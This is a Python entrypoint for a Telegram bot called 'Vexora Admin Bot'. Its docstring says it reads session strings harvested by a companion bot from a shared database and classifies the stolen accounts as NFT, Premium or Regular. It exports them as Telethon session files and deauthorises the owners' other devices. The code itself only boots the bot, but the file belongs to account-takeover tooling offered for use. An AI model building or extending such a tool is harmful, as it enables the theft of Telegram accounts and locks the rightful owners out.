"""Vexora Admin Bot — entrypoint.

Boots a dedicated Pyrogram bot that reads session strings harvested by the
main @VexoraAdsBot from the shared Neon Postgres DB, classifies each account
(NFT / Premium / Regular), lets admins browse & export them as Telethon
``.session`` files inside ``@username.zip``, and deauths other devices.

Run alongside the main bot:  python adminbot.py
"""
import asyncio

from adminconfig import logger
from adminclient import admin_app
import adminhandlers  # noqa: F401  — registers handlers
import adminstore


async def _bootstrap():
    logger.info("Vexora Admin Bot starting...")
    await adminstore.init_pool()
    await admin_app.start()
    me = await admin_app.get_me()
    logger.info(f"Vexora Admin Bot online as @{me.username}")
    await asyncio.Event().wait()


if __name__ == "__main__":
    try:
        admin_app.run(_bootstrap())
    except KeyboardInterrupt:
        logger.info("Admin bot stopped.")
